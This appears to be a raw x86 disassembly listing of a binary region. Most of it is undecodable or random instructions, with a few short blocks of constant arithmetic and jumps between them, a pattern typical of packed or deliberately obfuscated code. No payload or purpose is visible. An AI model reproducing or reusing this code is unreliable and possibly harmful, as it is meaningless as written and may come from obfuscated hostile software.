  40e15f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e160:	test   eax,0x8b07fd7a
  40e165:	sub    eax,0x9b52da3c
  40e16a:	popf   
  40e16b:	lahf   
  40e16c:	sbb    eax,0x851d5d66
  40e171:	cmp    BYTE PTR [ebx+eax*1-0x6afb603e],dl
  40e178:	imul   ebp,DWORD PTR [eax+0x458b5c27],0xfffffff0
  40e17f:	xor    eax,0xffffe1ce
  40e184:	add    eax,DWORD PTR [ebp-0xc]
  40e187:	jmp    0x40e44b
  40e18c:	sub    dh,ah
  40e18e:	mov    BYTE PTR [ecx],ah
  40e190:	inc    esi
  40e191:	pop    ds
  40e192:	and    dh,bl
  40e194:	leave  
  40e195:	out    0x4b,eax
  40e197:	jle    0x40e1ef
  40e199:	shl    ebp,1
  40e19b:	stos   BYTE PTR es:[edi],al
  40e19c:	into   
  40e19d:	enter  0x1818,0xd2
  40e1a1:	adc    al,0x18
  40e1a3:	sbb    cl,cl
  40e1a5:	(bad)  
  40e1a6:	cmp    eax,0x4d0b2729
  40e1ab:	sbb    eax,0xa71f7923
  40e1b0:	imul   edx,DWORD PTR [ecx-0x5],0x1783a56a
  40e1b7:	in     al,0x21
  40e1b9:	sbb    eax,0xae4cf7c
  40e1be:	jns    0x40e21c
  40e1c0:	ins    BYTE PTR es:[edi],dx
  40e1c1:	retf   0x5629
  40e1c4:	pop    ss
  40e1c5:	fsubr  QWORD PTR [eax+0x469ad642]
  40e1cb:	stos   DWORD PTR es:[edi],eax
  40e1cc:	mov    ds:0x52bf515b,al
  40e1d1:	cli    
  40e1d2:	icebp  
  40e1d3:	push   es
  40e1d4:	push   0xffffff88
  40e1d6:	adc    BYTE PTR [edx-0x32c53bac],al
  40e1dc:	bound  edi,QWORD PTR [edi]
  40e1de:	push   esp
  40e1df:	push   ebx
  40e1e0:	ins    DWORD PTR es:[edi],dx
  40e1e1:	test   eax,0x1051c189
  40e1e6:	inc    esi
  40e1e7:	int3   
  40e1e8:	jns    0x40e1f3
  40e1ea:	pop    esp
  40e1eb:	push   eax
  40e1ec:	arpl   WORD PTR [ebx-0x4336738d],di
  40e1f2:	jbe    0x40e1e5
  40e1f4:	(bad)  
  40e1f5:	xlat   BYTE PTR ds:[ebx]
  40e1f6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e1f7:	dec    esi
  40e1f8:	std    
  40e1f9:	(bad)  
  40e1fa:	fstp   QWORD PTR [ecx-0x3e6db620]
  40e200:	mov    esi,0xa9295204
  40e205:	adc    ecx,ebp
  40e207:	jno    0x40e1bd
  40e209:	cli    
  40e20a:	pop    ecx
  40e20b:	xchg   BYTE PTR [ebp+0x10],bh
  40e20e:	loopne 0x40e236
  40e210:	test   eax,0xb9d618bb
  40e215:	test   BYTE PTR [eax-0x4e451fe1],ah
  40e21b:	dec    ebp
  40e21c:	jmp    0x2936c223
  40e221:	adc    bl,al
  40e223:	pop    eax
  40e224:	jb     0x40e275
  40e226:	test   BYTE PTR [eax],0xa7
  40e229:	sub    edx,DWORD PTR [eax]
  40e22b:	dec    esp
  40e22c:	add    eax,0x1d4da907
  40e231:	repz adc DWORD PTR [ebx+0x3d],esp
  40e235:	add    eax,DWORD PTR [ebx+esi*8+0x45]
  40e239:	arpl   WORD PTR [edx+0x1c],bx
  40e23c:	arpl   WORD PTR [ecx-0x2e95c2f1],bp
  40e242:	adc    al,0xf
  40e244:	fist   DWORD PTR [eax]
  40e246:	add    edi,DWORD PTR [edi]
  40e248:	scas   eax,DWORD PTR es:[edi]
  40e249:	push   edx
  40e24a:	test   dl,bl
  40e24c:	xor    eax,0x3df8016f
  40e251:	push   ss
  40e252:	pop    ebx
  40e253:	add    al,0x7d
  40e255:	dec    ebx
  40e256:	js     0x40e28b
  40e258:	int    0xbe
  40e25a:	sub    BYTE PTR ds:[edx+edx*4],ah
  40e25e:	imul   ebx,DWORD PTR [eax],0x7a10668a
  40e264:	fcomp  DWORD PTR [ebx-0x360a2c31]
  40e26a:	pop    ebx
  40e26b:	ret    
  40e26c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e26d:	jb     0x40e2e3
  40e26f:	adc    esp,DWORD PTR [ebp-0x3a]
  40e272:	pop    edx
  40e273:	or     bl,dl
  40e275:	jnp    0x40e232
  40e277:	sbb    BYTE PTR ds:0xdedafed0,dl
  40e27d:	cmp    dh,BYTE PTR [esi+esi*8+0xb]
  40e281:	(bad)  
  40e283:	mov    dh,0x43
  40e285:	or     al,0x30
  40e287:	ins    BYTE PTR es:[edi],dx
  40e288:	jno    0x40e21d
  40e28a:	out    dx,al
  40e28b:	outs   dx,BYTE PTR ds:[esi]
  40e28c:	mov    eax,0xbacaa661
  40e291:	std    
  40e292:	test   eax,0x77e657d
  40e297:	pop    edi
  40e298:	inc    ebx
  40e299:	fbstp  TBYTE PTR [ecx+edx*1+0x7306c664]
  40e2a0:	jmp    0x555c:0x1b36dbd0
  40e2a7:	adc    al,0x71
  40e2a9:	add    al,0x1b
  40e2ab:	push   edx
  40e2ac:	xchg   esi,eax
  40e2ad:	cdq    
  40e2ae:	lea    esp,[ebp-0x629ba027]
  40e2b4:	cli    
  40e2b5:	cmp    eax,0xc75bbb7a
  40e2ba:	in     al,0x43
  40e2bc:	into   
  40e2bd:	dec    ebx
  40e2be:	adc    BYTE PTR [ebp-0x65],ch
  40e2c1:	retf   
  40e2c2:	cmc    
  40e2c3:	dec    ebp
  40e2c4:	(bad)  
  40e2c5:	outs   dx,BYTE PTR ds:[esi]
  40e2c6:	mul    DWORD PTR [eax+0x73c38a14]
  40e2cc:	je     0x40e2c8
  40e2ce:	inc    eax
  40e2cf:	add    DWORD PTR [ebp+0x75],ebp
  40e2d2:	inc    edi
  40e2d3:	stos   DWORD PTR es:[edi],eax
  40e2d4:	loop   0x40e277
  40e2d6:	xchg   ebp,eax
  40e2d7:	push   es
  40e2d8:	mov    ds:0xb7e46628,al
  40e2dd:	les    ebp,FWORD PTR [ebx]
  40e2df:	in     al,dx
  40e2e0:	push   eax
  40e2e1:	jmp    0xc3c6232
  40e2e6:	jo     0x40e320
  40e2e8:	leave  
  40e2e9:	jmp    0x4639af9c
  40e2ee:	js     0x40e276
  40e2f0:	mov    bh,0x6d
  40e2f2:	aaa    
  40e2f3:	imul   eax,eax,0xffffffda
  40e2f6:	push   ebx
  40e2f7:	inc    ecx
  40e2f8:	mov    dh,bh
  40e2fa:	sub    ah,BYTE PTR ds:0x8483b1b0
  40e300:	ret    
  40e301:	nop
  40e302:	cmp    BYTE PTR [esi+0x5a6cfb8a],ah
  40e308:	add    al,0x62
  40e30a:	fcomi  st,st(5)
  40e30c:	adc    BYTE PTR [esi],dl
  40e30e:	dec    ebp
  40e30f:	(bad)  
  40e310:	fld    DWORD PTR [ecx+0x445b8e42]
  40e316:	jge    0x40e2c8
  40e318:	sub    edi,edi
  40e31a:	mov    ds:0x4090910c,al
  40e31f:	adc    eax,ecx
  40e321:	cli    
  40e322:	mov    ds:0x42cddce8,eax
  40e327:	sbb    eax,0xa1eed54a
  40e32c:	mov    ebx,0x50cff1df
  40e331:	out    0x32,al
  40e333:	xor    ch,BYTE PTR ds:0x9ddb6ff6
  40e339:	xchg   ebx,eax
  40e33a:	sub    BYTE PTR ds:0xee4dbd2c,ch
  40e340:	ficom  DWORD PTR [ebx+eax*2]
  40e343:	jge    0x40e368
  40e345:	jp     0x40e3a1
  40e347:	add    DWORD PTR [edx-0x1b7eddda],ecx
  40e34d:	and    DWORD PTR [edi+0x17],eax
  40e350:	fstp   QWORD PTR [ebx]
  40e352:	daa    
  40e353:	mov    bh,0x89
  40e355:	xor    DWORD PTR [edi-0x3de1b9eb],eax
  40e35b:	jb     0x40e3c5
  40e35d:	sahf   
  40e35e:	push   eax
  40e35f:	fisttp DWORD PTR [esi]
  40e361:	mov    ch,BYTE PTR [ebx+edx*2-0x7]
  40e365:	pop    ebp
  40e366:	xor    dh,dl
  40e368:	pop    ss
  40e369:	retf   0xfb1f
  40e36c:	pop    ebp
  40e36d:	(bad)  
  40e36e:	outs   dx,DWORD PTR ds:[esi]
  40e36f:	or     ecx,DWORD PTR [edx]
  40e371:	ds addr16 pop es
  40e374:	sti    
  40e375:	inc    ebx
  40e376:	cmp    dh,BYTE PTR [ebp-0x4d]
  40e379:	or     dh,BYTE PTR [ebx+0x4c]
  40e37c:	cdq    
  40e37d:	mov    ecx,0x1bf90881
  40e382:	or     ebp,ecx
  40e384:	test   eax,0xe41f98ea
  40e389:	call   0xacda:0xb43e6889
  40e390:	adc    BYTE PTR [ebp-0x1e8b6b0b],ch
  40e396:	fbstp  TBYTE PTR [ebp+0x6f]
  40e399:	sub    eax,0xc575632f
  40e39e:	xor    BYTE PTR [ecx],bh
  40e3a0:	out    0x42,al
  40e3a2:	and    edi,DWORD PTR [esp+ebp*1+0x13f4c7d1]
  40e3a9:	dec    edi
  40e3aa:	dec    ebp
  40e3ab:	ret    0x1a1b
  40e3ae:	cmp    esp,DWORD PTR [ebp+0x38]
  40e3b1:	push   edx
  40e3b2:	es sbb si,bx
  40e3b6:	in     al,dx
  40e3b7:	push   eax
  40e3b8:	ret    0x8b53
  40e3bb:	sub    ch,ah
  40e3bd:	push   edi
  40e3be:	and    ecx,esp
  40e3c0:	loopne 0x40e354
  40e3c2:	and    DWORD PTR [ecx+0x43ed6252],edi
  40e3c8:	lods   al,BYTE PTR ds:[esi]
  40e3c9:	push   0x84bc3720
  40e3ce:	in     eax,0xb4
  40e3d0:	sti    
  40e3d1:	jno    0x40e3f0
  40e3d3:	mov    ebx,0x2edaae72
  40e3d8:	or     eax,0x599014db
  40e3dd:	ins    BYTE PTR es:[edi],dx
  40e3de:	mov    edx,0x6218d66e
  40e3e3:	outs   dx,BYTE PTR ds:[esi]
  40e3e4:	fwait
  40e3e5:	and    eax,0xaaa016d8
  40e3ea:	jle    0x40e41b
  40e3ec:	mov    bh,0xa
  40e3ee:	jmp    0x6e0f:0xf2a9090d
  40e3f5:	xor    ah,0xcc
  40e3f8:	adc    ebp,DWORD PTR [ecx+0x54043ac3]
  40e3fe:	inc    esi
  40e3ff:	shl    ecx,0xb5
  40e402:	pushf  
  40e403:	mov    dh,0x32
  40e405:	dec    ebp
  40e406:	clc    
  40e407:	enter  0x7fc9,0xb9
  40e40b:	stos   DWORD PTR es:[edi],eax
  40e40c:	into   
  40e40d:	imul   esi,DWORD PTR [ebp-0x2d65e606],0x2fea03ff
  40e417:	fs adc eax,0x37c68dda
  40e41d:	out    0xbc,al
  40e41f:	dec    edi
  40e420:	lock push edx
  40e422:	(bad)
  40e425:	ss aaa 
  40e427:	aas    
  40e428:	fcomi  st,st(6)
  40e42a:	int    0xc
  40e42c:	jne    0x40e408
  40e42e:	push   0x3a
  40e430:	mov    bh,0xa8
  40e432:	mov    DWORD PTR [ebx+ebp*8+0x2a15207e],ebp
  40e439:	dec    esp
  40e43a:	mov    ds:0xfd4448f0,al
  40e43f:	pop    esi
  40e440:	mov    edi,0x246f4ec6
  40e445:	test   esi,esi
  40e447:	scas   al,BYTE PTR es:[edi]
  40e448:	test   BYTE PTR [ecx+0x25d23331],al
  40e44e:	xor    ebp,DWORD PTR [ebp+0x0]
  40e451:	add    BYTE PTR [ebp-0x651ffe74],cl
  40e457:	(bad)  
  40e458:	dec    DWORD PTR [ebx+0x5d8b0845]
  40e45e:	cld    
  40e45f:	add    eax,edi
  40e461:	div    ebx
  40e463:	mov    edx,DWORD PTR [ebp-0x8]
  40e466:	mov    ebx,0x940a7
  40e46b:	sub    eax,edx
  40e46d:	xor    edx,edx
  40e46f:	div    ebx
  40e471:	add    eax,esi
  40e473:	cmp    ecx,eax
  40e475:	jb     0x40db77
  40e47b:	xor    ebx,ebx
  40e47d:	inc    ebx
  40e47e:	mov    DWORD PTR [ebp+0xc],0x77bd
  40e485:	mov    DWORD PTR [ebp+0x8],0x4f2a
  40e48c:	mov    DWORD PTR [ebp-0x8],0x4738
  40e493:	mov    DWORD PTR [ebp-0xc],0x6c4e
  40e49a:	mov    DWORD PTR [ebp-0x10],0x7f0d
  40e4a1:	mov    DWORD PTR [ebp-0x14],0x64ec
  40e4a8:	mov    DWORD PTR [ebp-0x18],0x1984
  40e4af:	mov    DWORD PTR [ebp-0x1c],0x293
  40e4b6:	mov    eax,DWORD PTR [ebp+0x8]
  40e4b9:	mov    ecx,DWORD PTR [ebp+0xc]
  40e4bc:	add    eax,0x1ef2
  40e4c1:	and    eax,ecx
  40e4c3:	xor    eax,0x7240
  40e4c8:	mov    ecx,0x7aaa
  40e4cd:	jmp    0x40e791
  40e4d2:	mov    eax,0x5a62ef3c
  40e4d7:	and    bl,BYTE PTR [edx+edi*1]
  40e4da:	ss dec esi
  40e4dc:	xor    DWORD PTR [eax+0x7e4d6098],0x1818c289
  40e4e6:	rcl    BYTE PTR [eax+ebx*1],cl
  40e4e9:	sbb    BYTE PTR [esi-0x210821c2],bh
  40e4ef:	inc    ebx
  40e4f0:	lods   al,BYTE PTR ds:[esi]
  40e4f1:	fadd   st,st(2)
  40e4f3:	push   ecx
  40e4f4:	push   ebx
  40e4f5:	leave  
  40e4f6:	and    eax,edx
  40e4f8:	sub    DWORD PTR [ecx+0x2a],edx
  40e4fb:	mov    ds:0xd03639e1,eax
  40e500:	cwde   
  40e501:	push   ebx
  40e502:	int3   
  40e503:	(bad)  
  40e504:	cld    
  40e505:	mov    ecx,0x517ddd1f
  40e50a:	sahf   
  40e50b:	(bad)  
  40e50c:	jmp    0x563d:0xf3c97266
  40e513:	call   0x921f:0x94ed3084
  40e51a:	icebp  
  40e51b:	dec    edx
  40e51c:	js     0x40e567
  40e51e:	sub    bl,cl
  40e520:	dec    ebx
  40e521:	out    0x86,al
  40e523:	xchg   ebx,eax
  40e524:	push   edx
  40e525:	push   edi
  40e526:	jae    0x40e4b4
  40e528:	jecxz  0x40e4cb
  40e52a:	push   ebx
  40e52b:	(bad)  
  40e52c:	neg    BYTE PTR [ecx]
  40e52e:	loopne 0x40e509
  40e530:	inc    esi
  40e531:	fadd   st(2),st
  40e533:	dec    ebx
  40e534:	repnz dec esi
  40e536:	dec    ebp
  40e537:	sbb    ch,BYTE PTR ds:0x5dddeff1
  40e53d:	inc    eax
  40e53e:	mov    ebx,0x27737aa9
  40e543:	mov    BYTE PTR [esi],bh
  40e545:	dec    esi
  40e547:	add    eax,0x7710118a
  40e54c:	dec    edi
  40e54d:	int    0x1b
  40e54f:	jae    0x40e5c2
  40e551:	jns    0x40e50b
  40e553:	sbb    esi,ebp
  40e555:	sub    dh,BYTE PTR ds:0x19c6fd0
  40e55b:	arpl   WORD PTR [edx],dx
  40e55d:	in     al,dx
  40e55e:	mov    esp,0x9844fd2c
  40e563:	std    
  40e564:	add    al,0x65
  40e566:	sahf   
  40e567:	or     ebx,DWORD PTR [ebx+0xeb5f386]
  40e56d:	jnp    0x40e55a
  40e56f:	add    ebp,0xc17d4da
  40e575:	mov    bh,0x13
  40e577:	mov    ebx,edx
  40e579:	dec    edi
  40e57a:	mov    ah,dh
  40e57c:	fnstsw WORD PTR [eax]
  40e57e:	(bad)  
  40e57f:	sub    ebp,DWORD PTR [edi+0x5428f469]
  40e585:	mov    DWORD PTR [edx],ecx
  40e587:	push   ecx
  40e588:	cmc    
  40e589:	jle    0x40e5fa
  40e58b:	dec    ecx
  40e58c:	pop    es
  40e58d:	jmp    0x40e5e3
  40e58f:	sar    ebx,0x99
  40e592:	push   edx
  40e593:	dec    ebx
  40e594:	mov    bh,BYTE PTR [eax-0x6ec0f778]
  40e59a:	mov    ?,WORD PTR [ebx+0x23]
  40e59d:	outs   dx,BYTE PTR ds:[esi]
  40e59e:	inc    eax
  40e59f:	les    eax,FWORD PTR [esi+0x6bd687cf]
  40e5a5:	mov    ecx,0x5a9682c5
  40e5aa:	adc    BYTE PTR ds:0xbfca2a8e,ah
  40e5b0:	inc    edx
  40e5b1:	in     al,0xf2
  40e5b3:	stc    
  40e5b4:	mov    BYTE PTR [edi-0x22e2a4bc],cl
  40e5ba:	imul   edx,DWORD PTR [ebp-0x42],0xc872f19a
  40e5c1:	sub    DWORD PTR [esi+0x6f],eax
  40e5c4:	cli    
  40e5c5:	ror    edi,cl
  40e5c7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e5c8:	xchg   esi,eax
  40e5c9:	mov    ch,ch
  40e5cb:	enter  0xf922,0x20
  40e5cf:	cmp    eax,0x52af4cde
  40e5d4:	jl     0x40e653
  40e5d6:	pop    ds
  40e5d7:	aad    0x81
  40e5d9:	mov    bl,0x50
  40e5db:	sahf   
  40e5dc:	scas   al,BYTE PTR es:[edi]
  40e5dd:	lock out 0x91,al
  40e5e0:	ins    BYTE PTR es:[edi],dx
  40e5e1:	cmp    al,0x9d
  40e5e3:	mov    esp,0x3f8b33da
  40e5e8:	mov    dh,0xcf
  40e5ea:	mov    esi,DWORD PTR [ebp-0x52ea8e2f]
  40e5f0:	pop    edi
  40e5f1:	push   esp
  40e5f2:	jne    0x40e5d5
  40e5f4:	cwde   
  40e5f5:	jge    0x40e660
  40e5f7:	repnz shl DWORD PTR [eax+eax*1],1
  40e5fb:	dec    esp
  40e5fc:	mov    ds:0x81675f8e,eax
  40e601:	rol    BYTE PTR es:[eax],0xa1
  40e605:	mov    gs,WORD PTR [ecx+ebp*1]
  40e608:	inc    edi
  40e609:	loopne 0x40e5e4
  40e60b:	in     al,0x2b
  40e60d:	nop
  40e60e:	out    dx,eax
  40e60f:	xor    eax,0x5f04f2a
  40e614:	in     eax,0x29
  40e616:	pop    es
  40e617:	adc    bh,0x16
  40e61a:	xor    al,0xb4
  40e61c:	aad    0x6c
  40e61e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e61f:	and    al,0xdc
  40e621:	push   ss
  40e622:	js     0x40e635
  40e624:	dec    esp
  40e625:	dec    ebx
  40e626:	push   ebx
  40e627:	sahf   
  40e628:	jecxz  0x40e6a3
  40e62a:	sub    BYTE PTR [ebp+0x685e0143],bl
  40e630:	int    0x56
  40e632:	adc    eax,0xb61c820f
  40e637:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e638:	cs dec esi
  40e63a:	jns    0x40e686
  40e63c:	cli    
  40e63d:	mov    ah,0xd0
  40e63f:	popa   
  40e640:	(bad)  
  40e641:	jp     0x40e661
  40e643:	fcom   DWORD PTR [esi]
  40e645:	arpl   WORD PTR [eax+ecx*4+0xb43619b],dx
  40e64c:	add    eax,0xcef19ee5
  40e651:	xlat   BYTE PTR ds:[ebx]
  40e652:	xchg   esp,eax
  40e653:	aad    0xcf
  40e655:	call   0x6fcfa87
  40e65a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e65b:	in     al,dx
  40e65c:	icebp  
  40e65d:	adc    DWORD PTR [edi-0x34ffa2cb],ecx
  40e663:	test   al,0x9
  40e665:	inc    ebp
  40e666:	sbb    DWORD PTR [ecx],eax
  40e668:	xchg   edi,eax
  40e669:	add    DWORD PTR [edx-0x258acf65],edx
  40e66f:	retf   
  40e670:	jp     0x40e6c3
  40e672:	pop    esi
  40e673:	cmp    eax,0xf4bc5756
  40e678:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e679:	xchg   edi,eax
  40e67a:	int3   
  40e67b:	iret   
  40e67c:	mov    cl,0x90
  40e67e:	data16 ins BYTE PTR es:[edi],dx
  40e680:	mov    eax,0xca464a9f
  40e685:	cwde   
  40e686:	and    ah,BYTE PTR [ebp-0x43]
  40e689:	xor    al,0x15
  40e68b:	in     eax,0xb8
  40e68d:	dec    edx
  40e68e:	pusha  
  40e68f:	clc    
  40e690:	pop    edi
  40e691:	xchg   edx,eax
  40e692:	xor    ebx,edi
  40e694:	sub    DWORD PTR [ebp-0x21122944],ebp
  40e69a:	fs pop esp
  40e69c:	add    dl,BYTE PTR [edx-0x345044a9]
  40e6a2:	dec    esi
  40e6a3:	mov    edi,0x599b8f9a
  40e6a8:	lods   al,BYTE PTR ds:[esi]
  40e6a9:	pop    ss
  40e6aa:	fst    DWORD PTR [ecx-0x71596065]
  40e6b0:	and    eax,0x9380ed5d
  40e6b5:	mov    bh,0xb8
  40e6b7:	test   eax,0xf5848465
  40e6bc:	xlat   BYTE PTR ds:[ebx]
  40e6bd:	imul   ecx,DWORD PTR [edi-0x29],0x530745aa
  40e6c4:	mov    ebx,0xc83c489
  40e6c9:	(bad)  
  40e6ca:	(bad)  
  40e6cb:	sbb    DWORD PTR [ecx],eax
  40e6cd:	xlat   BYTE PTR ds:[ebx]
  40e6ce:	dec    eax
  40e6cf:	push   0xfffffff5
  40e6d1:	mov    bh,0x32
  40e6d3:	dec    ebp
  40e6d4:	nop
  40e6d5:	loop   0x40e6d5
  40e6d7:	dec    ecx
  40e6d8:	or     BYTE PTR [edx],bh
  40e6da:	or     BYTE PTR [ebx],cl
  40e6dc:	loope  0x40e719
  40e6de:	xor    esi,eax
  40e6e0:	xor    DWORD PTR [ecx-0x7a7d9d71],ecx
  40e6e6:	fwait
  40e6e7:	sbb    esi,DWORD PTR [edx-0x75]
  40e6ea:	xor    bl,BYTE PTR [ecx-0x3c]
  40e6ed:	mov    al,0x2e
  40e6ef:	add    eax,0x4e267849
  40e6f4:	push   0x50
  40e6f6:	retfw  0x5e62
  40e6fa:	cmp    eax,0x76a5a8a9
  40e6ff:	fist   WORD PTR [esi]
  40e701:	mov    ds:0x28533d91,eax
  40e706:	out    dx,al
  40e707:	xchg   esi,eax
  40e708:	outs   dx,BYTE PTR ds:[esi]
  40e709:	inc    eax
  40e70a:	mov    dh,cl
  40e70c:	outs   dx,BYTE PTR ds:[esi]
  40e70d:	cmp    esi,ebp
  40e70f:	(bad)  
  40e710:	int    0x63
  40e712:	dec    ebx
  40e713:	mov    cl,0xb9
  40e715:	sahf   
  40e716:	push   0xb3aa259c
  40e71b:	nop
  40e71c:	fisttp WORD PTR [ebx]
  40e71e:	inc    esi
  40e71f:	leave  
  40e720:	out    0x54,eax
  40e722:	pop    ecx
  40e723:	stos   DWORD PTR es:[edi],eax
  40e724:	mov    edx,DWORD PTR [ecx-0x19]
  40e727:	out    dx,al
  40e728:	lock xor DWORD PTR [eax+0x6b],esp
  40e72c:	stc    
  40e72d:	in     eax,0xc
  40e72f:	fucompp 
  40e731:	in     al,dx
  40e732:	fcomp  DWORD PTR [edi+edi*4]
  40e735:	bound  eax,QWORD PTR [ecx-0x3ba5862]
  40e73b:	leave  
  40e73c:	and    DWORD PTR [esi],0xb8b2ff48
  40e742:	test   al,0x2e
  40e744:	cmp    DWORD PTR [edx],ebp
  40e746:	loopne 0x40e6ea
  40e748:	int    0x51
  40e74a:	hlt    
  40e74b:	pop    eax
  40e74c:	out    0x8b,eax
  40e74e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e74f:	ss ds jne 0x40e743
  40e753:	mov    ch,0xcb
  40e755:	push   esp
  40e756:	icebp  
  40e757:	push   0x593a21f1
  40e75c:	(bad)  
  40e75d:	lahf   
  40e75e:	ins    BYTE PTR es:[edi],dx
  40e75f:	outs   dx,BYTE PTR ds:[esi]
  40e760:	mov    fs,WORD PTR [esi]
  40e762:	mov    eax,0xe9891ee3
  40e767:	add    DWORD PTR [eax-0x762cb222],ebx
  40e76d:	in     eax,dx
  40e76e:	jb     0x40e78f
  40e770:	aam    0x6d
  40e772:	add    al,bh
  40e774:	inc    ebx
  40e775:	or     al,BYTE PTR [eax]
  40e777:	sub    DWORD PTR [edx+0x1972b789],ecx
  40e77d:	mov    ebp,0xa01919a8
  40e782:	(bad)  
  40e783:	clc    
  40e784:	push   esp
  40e785:	popa   
  40e786:	enter  0x9566,0xf8
  40e78a:	imul   ecx,ebx,0x51159f6a
  40e790:	adc    eax,0x45c7c82b
  40e795:	or     al,0xd3
  40e797:	or     BYTE PTR [eax],al
  40e799:	add    bh,al
  40e79b:	inc    ebp
  40e79c:	or     BYTE PTR [edx-0x76ffffdd],dl
  40e7a2:	pop    ebp
  40e7a3:	loopne 0x40e76c
  40e7a5:	inc    ebp
  40e7a6:	fmul   QWORD PTR [edi-0x38ffffcd]
  40e7ac:	inc    ebp
  40e7ad:	fmul   st,st(1)
  40e7af:	popa   
  40e7b0:	add    BYTE PTR [eax],al
  40e7b2:	mov    eax,DWORD PTR [ebp+0x8]
  40e7b5:	mov    edx,DWORD PTR [ebp+0xc]
  40e7b8:	imul   eax,edx
  40e7bb:	xor    eax,0x40a0
  40e7c0:	or     eax,0x1a48
  40e7c5:	xor    eax,0x139ddb0
  40e7ca:	mov    esi,ecx
  40e7cc:	sub    esi,eax
  40e7ce:	mov    eax,DWORD PTR [ebp-0x28]
  40e7d1:	mov    edx,DWORD PTR [ebp-0x24]
  40e7d4:	mov    edi,DWORD PTR [ebp-0x20]
  40e7d7:	or     eax,0x1cc2
  40e7dc:	sub    eax,edx
  40e7de:	jmp    0x40eaa2
  40e7e3:	or     BYTE PTR [esp+ebx*1-0xd],0x1c
  40e7e8:	loop   0x40e828
  40e7ea:	sbb    bh,BYTE PTR [esi]
  40e7ec:	call   DWORD PTR [ebx-0x56]
  40e7ef:	dec    ebp
  40e7f0:	cli    
  40e7f1:	addr16 mov esp,0x1818be42
  40e7f7:	rcl    BYTE PTR [eax+ebx*1],cl
  40e7fa:	sbb    BYTE PTR [ecx+0x6adf55d2],dh
  40e800:	cli    
  40e801:	add    DWORD PTR [ebx],esi
  40e803:	std    
  40e804:	test   al,0xa0
  40e806:	js     0x40e789
  40e808:	xor    BYTE PTR [ebp-0x9],ah
  40e80b:	int    0xf1
  40e80d:	gs xor al,0x47
  40e810:	mov    ds:0x23106183,al
  40e815:	push   ds
  40e816:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e817:	pop    ecx
  40e818:	pop    esp
  40e819:	push   DWORD PTR [ebp-0x26]
  40e81c:	adc    DWORD PTR [edi+edi*8-0x81ba20f],ebx
  40e823:	xchg   edi,eax
  40e824:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e825:	cmp    DWORD PTR [ebp-0x72],0xffffffae
  40e829:	xchg   DWORD PTR [ecx-0x1e],eax
  40e82c:	push   esi
  40e82d:	fisubr WORD PTR [ebp-0x46c903e0]
  40e833:	mov    bl,BYTE PTR [edx+0x1f882c72]
  40e839:	call   0x76269c63
  40e83e:	push   cs
  40e83f:	je     0x40e87d
  40e841:	inc    ecx
  40e842:	push   ecx
  40e843:	rcl    ch,cl
  40e845:	loop   0x40e87a
  40e847:	sti    
  40e848:	aas    
  40e849:	push   ds
  40e84a:	jecxz  0x40e849
  40e84c:	ffreep st(3)
  40e84e:	fwait
  40e84f:	mov    esp,0xac8d3337
  40e854:	sub    al,0x24
  40e856:	cli    
  40e857:	push   cs
  40e858:	inc    ebp
  40e859:	aas    
  40e85a:	ins    DWORD PTR es:[edi],dx
  40e85b:	mov    cl,0x7c
  40e85d:	jle    0x40e8a6
  40e85f:	xchg   esi,eax
  40e860:	cmc    
  40e861:	je     0x40e834
  40e863:	pop    ebx
  40e864:	fisttp WORD PTR [esi+0x6558724d]
  40e86a:	or     eax,ebx
  40e86c:	fimul  WORD PTR [esi+edx*2+0x18]
  40e870:	mov    ecx,0xaf0c5357
  40e875:	dec    ebp
  40e876:	pusha  
  40e877:	pusha  
  40e878:	or     BYTE PTR [ecx-0x60],al
  40e87b:	(bad)  
  40e87c:	jmp    0x40e80f
  40e87e:	mov    WORD PTR [eax+0x16bd1e7e],ss
  40e884:	sbb    al,0x46
  40e886:	out    dx,al
  40e887:	xor    ecx,DWORD PTR [ebx+0x2c]
  40e88a:	arpl   WORD PTR [ecx+0x1be2c755],dx
  40e890:	iret   
  40e891:	jo     0x40e8e3
  40e893:	dec    eax
  40e894:	mov    al,ds:0x1c3601a5
  40e899:	or     ecx,edi
  40e89b:	sbb    DWORD PTR [ecx],eax
  40e89d:	mov    eax,0xd261bafc
  40e8a2:	stc    
  40e8a3:	test   eax,0xfabf1b98
  40e8a8:	push   ebx
  40e8a9:	push   edx
  40e8aa:	stc    
  40e8ab:	pushf  
  40e8ac:	and    al,0xb1
  40e8ae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e8af:	pop    ss
  40e8b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e8b1:	in     al,dx
  40e8b2:	imul   edi,DWORD PTR [edi+0x606fb119],0xabe69aee
  40e8bc:	fxch   st(4)
  40e8be:	push   0x3bb75280
  40e8c3:	dec    edx
  40e8c4:	fwait
  40e8c5:	stos   DWORD PTR es:[edi],eax
  40e8c6:	sub    DWORD PTR [eax+0x4d12cb9e],edx
  40e8cc:	jbe    0x40e89c
  40e8ce:	pop    esi
  40e8cf:	adc    eax,0xfe90aff
  40e8d4:	test   eax,0xe0366a60
  40e8d9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e8da:	cli    
  40e8db:	mov    dh,0xd4
  40e8dd:	or     edi,DWORD PTR [eax]
  40e8df:	int    0x43
  40e8e1:	pop    eax
  40e8e2:	xchg   edi,eax
  40e8e3:	jge    0x40e922
  40e8e5:	es pop ss
  40e8e7:	xchg   ebp,eax
  40e8e8:	repz jmp 0x28273c74
  40e8ee:	sbb    al,0x4b
  40e8f0:	xor    BYTE PTR [esi+0x3c],0x1e
  40e8f4:	mov    ecx,0xc27f9c0f
  40e8f9:	mov    ch,BYTE PTR [ebx+0x56bf1299]
  40e8ff:	push   esp
  40e900:	jg     0x40e978
  40e902:	ins    DWORD PTR es:[edi],dx
  40e903:	dec    esp
  40e904:	test   eax,0x6310aba4
  40e909:	fnstsw WORD PTR [esi+eax*8]
  40e90c:	out    0x3f,eax
